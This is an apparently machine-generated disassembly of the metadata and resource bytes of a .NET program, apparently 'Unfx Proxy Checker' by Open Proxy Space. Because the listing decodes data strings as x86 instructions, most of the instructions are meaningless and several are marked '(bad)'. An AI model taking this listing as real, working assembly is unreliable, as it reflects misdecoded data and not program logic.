   140003682:	12 80 81 06 00 01    	adc    0x1000681(%rax),%al
   140003688:	01 12                	add    %edx,(%rdx)
   14000368a:	80 81 04 00 00 12 18 	addb   $0x18,0x12000004(%rcx)
   140003691:	03 00                	add    (%rax),%eax
   140003693:	00 01                	add    %al,(%rcx)
   140003695:	04 08                	add    $0x8,%al
   140003697:	00 12                	add    %dl,(%rdx)
   140003699:	7d 05                	jge    0x1400036a0
   14000369b:	08 00                	or     %al,(%rax)
   14000369d:	12 80 81 04 08 00    	adc    0x80481(%rax),%al
   1400036a3:	12 18                	adc    (%rax),%bl
   1400036a5:	08 01                	or     %al,(%rcx)
   1400036a7:	00 08                	add    %cl,(%rax)
   1400036a9:	00 00                	add    %al,(%rax)
   1400036ab:	00 00                	add    %al,(%rax)
   1400036ad:	00 1e                	add    %bl,(%rsi)
   1400036af:	01 00                	add    %eax,(%rax)
   1400036b1:	01 00                	add    %eax,(%rax)
   1400036b3:	54                   	push   %rsp
   1400036b4:	02 16                	add    (%rsi),%dl
   1400036b6:	57                   	push   %rdi
   1400036b7:	72 61                	jb     0x14000371a
   1400036b9:	70 4e                	jo     0x140003709
   1400036bb:	6f                   	outsl  (%rsi),(%dx)
   1400036bc:	6e                   	outsb  (%rsi),(%dx)
   1400036bd:	45 78 63             	rex.RB js 0x140003723
   1400036c0:	65 70 74             	gs jo  0x140003737
   1400036c3:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   1400036ca:	77 73                	ja     0x14000373f
   1400036cc:	01 08                	add    %ecx,(%rax)
   1400036ce:	01 00                	add    %eax,(%rax)
   1400036d0:	07                   	(bad)
   1400036d1:	01 00                	add    %eax,(%rax)
   1400036d3:	00 00                	add    %al,(%rax)
   1400036d5:	00 05 01 00 00 00    	add    %al,0x1(%rip)        # 0x1400036dc
   1400036db:	00 15 01 00 10 4f    	add    %dl,0x4f100001(%rip)        # 0x18f1036e2
   1400036e1:	70 65                	jo     0x140003748
   1400036e3:	6e                   	outsb  (%rsi),(%dx)
   1400036e4:	20 50 72             	and    %dl,0x72(%rax)
   1400036e7:	6f                   	outsl  (%rsi),(%dx)
   1400036e8:	78 79                	js     0x140003763
   1400036ea:	20 53 70             	and    %dl,0x70(%rbx)
   1400036ed:	61                   	(bad)
   1400036ee:	63 65 00             	movsxd 0x0(%rbp),%esp
   1400036f1:	00 17                	add    %dl,(%rdi)
   1400036f3:	01 00                	add    %eax,(%rax)
   1400036f5:	12 55 6e             	adc    0x6e(%rbp),%dl
   1400036f8:	66 78 20             	data16 js 0x14000371b
   1400036fb:	50                   	push   %rax
   1400036fc:	72 6f                	jb     0x14000376d
   1400036fe:	78 79                	js     0x140003779
   140003700:	20 43 68             	and    %al,0x68(%rbx)
   140003703:	65 63 6b 65          	movsxd %gs:0x65(%rbx),%ebp
   140003707:	72 00                	jb     0x140003709
   140003709:	00 24 01             	add    %ah,(%rcx,%rax,1)
   14000370c:	00 1f                	add    %bl,(%rdi)
   14000370e:	32 30                	xor    (%rax),%dh
   140003710:	31 39                	xor    %edi,(%rcx)
   140003712:	20 61 73             	and    %ah,0x73(%rcx)
   140003715:	73 6e                	jae    0x140003785
   140003717:	63 74 72 20          	movsxd 0x20(%rdx,%rsi,2),%esi
   14000371b:	28 4f 70             	sub    %cl,0x70(%rdi)
   14000371e:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003720:	20 50 72             	and    %dl,0x72(%rax)
   140003723:	6f                   	outsl  (%rsi),(%dx)
   140003724:	78 79                	js     0x14000379f
   140003726:	20 53 70             	and    %dl,0x70(%rbx)
   140003729:	61                   	(bad)
   14000372a:	63 65 29             	movsxd 0x29(%rbp),%esp
   14000372d:	00 00                	add    %al,(%rax)
   14000372f:	29 01                	sub    %eax,(%rcx)
   140003731:	00 24 34             	add    %ah,(%rsp,%rsi,1)
   140003734:	35 36 61 35 36       	xor    $0x36356136,%eax
   140003739:	64 66 2d 64 37       	fs sub $0x3764,%ax
   14000373e:	37                   	(bad)
   14000373f:	31 2d 34 34 61 30    	xor    %ebp,0x30613434(%rip)        # 0x170616b79
   140003745:	2d 39 34 38 61       	sub    $0x61383439,%eax
   14000374a:	2d 63 63 36 33       	sub    $0x33366363,%eax
   14000374f:	38 64 32 37          	cmp    %ah,0x37(%rdx,%rsi,1)
   140003753:	31 39                	xor    %edi,(%rcx)
   140003755:	34 37                	xor    $0x37,%al
   140003757:	00 00                	add    %al,(%rax)
   140003759:	0c 01                	or     $0x1,%al
   14000375b:	00 07                	add    %al,(%rdi)
   14000375d:	31 2e                	xor    %ebp,(%rsi)
   14000375f:	36 2e 31 2e          	ss cs xor %ebp,(%rsi)
   140003763:	30 00                	xor    %al,(%rax)
   140003765:	00 47 01             	add    %al,0x1(%rdi)
   140003768:	00 1a                	add    %bl,(%rdx)
   14000376a:	2e 4e                	cs rex.WRX
   14000376c:	45 54                	rex.RB push %r12
   14000376e:	46 72 61             	rex.RX jb 0x1400037d2
   140003771:	6d                   	insl   (%dx),(%rdi)
   140003772:	65 77 6f             	gs ja  0x1400037e4
   140003775:	72 6b                	jb     0x1400037e2
   140003777:	2c 56                	sub    $0x56,%al
   140003779:	65 72 73             	gs jb  0x1400037ef
   14000377c:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%rdi),%ebp
   140003783:	30 01                	xor    %al,(%rcx)
   140003785:	00 54 0e 14          	add    %dl,0x14(%rsi,%rcx,1)
   140003789:	46 72 61             	rex.RX jb 0x1400037ed
   14000378c:	6d                   	insl   (%dx),(%rdi)
   14000378d:	65 77 6f             	gs ja  0x1400037ff
   140003790:	72 6b                	jb     0x1400037fd
   140003792:	44 69 73 70 6c 61 79 	imul   $0x4e79616c,0x70(%rbx),%r14d
   140003799:	4e 
   14000379a:	61                   	(bad)
   14000379b:	6d                   	insl   (%dx),(%rdi)
   14000379c:	65 10 2e             	adc    %ch,%gs:(%rsi)
   14000379f:	4e                   	rex.WRX
   1400037a0:	45 54                	rex.RB push %r12
   1400037a2:	20 46 72             	and    %al,0x72(%rsi)
   1400037a5:	61                   	(bad)
   1400037a6:	6d                   	insl   (%dx),(%rdi)
   1400037a7:	65 77 6f             	gs ja  0x140003819
   1400037aa:	72 6b                	jb     0x140003817
   1400037ac:	20 34 04             	and    %dh,(%rsp,%rax,1)
   1400037af:	01 00                	add    %eax,(%rax)
   1400037b1:	00 00                	add    %al,(%rax)
   1400037b3:	41 01 00             	add    %eax,(%r8)
   1400037b6:	33 53 79             	xor    0x79(%rbx),%edx
   1400037b9:	73 74                	jae    0x14000382f
   1400037bb:	65 6d                	gs insl (%dx),(%rdi)
   1400037bd:	2e 52                	cs push %rdx
   1400037bf:	65 73 6f             	gs jae 0x140003831
   1400037c2:	75 72                	jne    0x140003836
   1400037c4:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400037c7:	2e 54                	cs push %rsp
   1400037c9:	6f                   	outsl  (%rsi),(%dx)
   1400037ca:	6f                   	outsl  (%rsi),(%dx)
   1400037cb:	6c                   	insb   (%dx),(%rdi)
   1400037cc:	73 2e                	jae    0x1400037fc
   1400037ce:	53                   	push   %rbx
   1400037cf:	74 72                	je     0x140003843
   1400037d1:	6f                   	outsl  (%rsi),(%dx)
   1400037d2:	6e                   	outsb  (%rsi),(%dx)
   1400037d3:	67 6c                	insb   (%dx),(%edi)
   1400037d5:	79 54                	jns    0x14000382b
   1400037d7:	79 70                	jns    0x140003849
   1400037d9:	65 64 52             	gs fs push %rdx
   1400037dc:	65 73 6f             	gs jae 0x14000384e
   1400037df:	75 72                	jne    0x140003853
   1400037e1:	63 65 42             	movsxd 0x42(%rbp),%esp
   1400037e4:	75 69                	jne    0x14000384f
   1400037e6:	6c                   	insb   (%dx),(%rdi)
   1400037e7:	64 65 72 08          	fs gs jb 0x1400037f3
   1400037eb:	31 36                	xor    %esi,(%rsi)
   1400037ed:	2e 30 2e             	cs xor %ch,(%rsi)
   1400037f0:	30 2e                	xor    %ch,(%rsi)
   1400037f2:	30 00                	xor    %al,(%rax)
   1400037f4:	00 5a 01             	add    %bl,0x1(%rdx)
   1400037f7:	00 4b 4d             	add    %cl,0x4d(%rbx)
   1400037fa:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%rbx),%esp
   140003801:	74 2e                	je     0x140003831
   140003803:	56                   	push   %rsi
   140003804:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%rbx),%esi
   14000380b:	75 64                	jne    0x140003871
   14000380d:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%rdi),%ebp
   140003814:	6f                   	outsl  (%rsi),(%dx)
   140003815:	72 73                	jb     0x14000388a
   140003817:	2e 53                	cs push %rbx
   140003819:	65 74 74             	gs je  0x140003890
   14000381c:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%rsi),%ebp
   140003823:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%rdi),%esp
   14000382a:	65 74 74             	gs je  0x1400038a1
   14000382d:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%rsi),%ebp
   140003834:	67 6c                	insb   (%dx),(%edi)
   140003836:	65 46 69 6c 65 47 65 	imul   $0x72656e65,%gs:0x47(%rbp,%r12,2),%r13d
   14000383d:	6e 65 72 
   140003840:	61                   	(bad)
   140003841:	74 6f                	je     0x1400038b2
   140003843:	72 09                	jb     0x14000384e
   140003845:	31 36                	xor    %esi,(%rsi)
   140003847:	2e 31 30             	cs xor %esi,(%rax)
   14000384a:	2e 30 2e             	cs xor %ch,(%rsi)
   14000384d:	30 00                	xor    %al,(%rax)
   14000384f:	00 08                	add    %cl,(%rax)
   140003851:	01 00                	add    %eax,(%rax)
   140003853:	02 00                	add    (%rax),%al
   140003855:	00 00                	add    %al,(%rax)
   140003857:	00 00                	add    %al,(%rax)
   140003859:	00 00                	add    %al,(%rax)
   14000385b:	00 b4 00 00 00 ce ca 	add    %dh,-0x35320000(%rax,%rax,1)
   140003862:	ef                   	out    %eax,(%dx)
   140003863:	be 01 00 00 00       	mov    $0x1,%esi
   140003868:	91                   	xchg   %eax,%ecx
   140003869:	00 00                	add    %al,(%rax)
   14000386b:	00 6c 53 79          	add    %ch,0x79(%rbx,%rdx,2)
   14000386f:	73 74                	jae    0x1400038e5
   140003871:	65 6d                	gs insl (%dx),(%rdi)
   140003873:	2e 52                	cs push %rdx
   140003875:	65 73 6f             	gs jae 0x1400038e7
   140003878:	75 72                	jne    0x1400038ec
   14000387a:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000387d:	2e 52                	cs push %rdx
   14000387f:	65 73 6f             	gs jae 0x1400038f1
   140003882:	75 72                	jne    0x1400038f6
   140003884:	63 65 52             	movsxd 0x52(%rbp),%esp
   140003887:	65 61                	gs (bad)
   140003889:	64 65 72 2c          	fs gs jb 0x1400038b9
   14000388d:	20 6d 73             	and    %ch,0x73(%rbp)
   140003890:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   140003893:	6c                   	insb   (%dx),(%rdi)
   140003894:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
   14000389b:	73 69                	jae    0x140003906
   14000389d:	6f                   	outsl  (%rsi),(%dx)
   14000389e:	6e                   	outsb  (%rsi),(%dx)
   14000389f:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
   1400038a4:	30 2e                	xor    %ch,(%rsi)
   1400038a6:	30 2c 20             	xor    %ch,(%rax,%riz,1)
   1400038a9:	43 75 6c             	rex.XB jne 0x140003918
   1400038ac:	74 75                	je     0x140003923
   1400038ae:	72 65                	jb     0x140003915
   1400038b0:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
   1400038b5:	72 61                	jb     0x140003918
   1400038b7:	6c                   	insb   (%dx),(%rdi)
   1400038b8:	2c 20                	sub    $0x20,%al
   1400038ba:	50                   	push   %rax
   1400038bb:	75 62                	jne    0x14000391f
   1400038bd:	6c                   	insb   (%dx),(%rdi)
   1400038be:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
   1400038c5:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
   1400038c9:	62 37 37 61 35       	(bad)
   1400038ce:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x173396a0a
   1400038d4:	34 65                	xor    $0x65,%al
   1400038d6:	30 38                	xor    %bh,(%rax)
   1400038d8:	39 23                	cmp    %esp,(%rbx)
   1400038da:	53                   	push   %rbx
   1400038db:	79 73                	jns    0x140003950
   1400038dd:	74 65                	je     0x140003944
   1400038df:	6d                   	insl   (%dx),(%rdi)
   1400038e0:	2e 52                	cs push %rdx
   1400038e2:	65 73 6f             	gs jae 0x140003954
   1400038e5:	75 72                	jne    0x140003959
   1400038e7:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400038ea:	2e 52                	cs push %rdx
   1400038ec:	75 6e                	jne    0x14000395c
   1400038ee:	74 69                	je     0x140003959
   1400038f0:	6d                   	insl   (%dx),(%rdi)
   1400038f1:	65 52                	gs push %rdx
   1400038f3:	65 73 6f             	gs jae 0x140003965
   1400038f6:	75 72                	jne    0x14000396a
   1400038f8:	63 65 53             	movsxd 0x53(%rbp),%esp
   1400038fb:	65 74 02             	gs je  0x140003900
	...
   140003906:	00 00                	add    %al,(%rax)
   140003908:	00 50 41             	add    %dl,0x41(%rax)
   14000390b:	44 50                	rex.R push %rax
   14000390d:	41                   	rex.B
   14000390e:	44 50                	rex.R push %rax
   140003910:	b4 00                	mov    $0x0,%ah
	...
   14000391e:	00 00                	add    %al,(%rax)
   140003920:	10 00                	adc    %al,(%rax)
	...
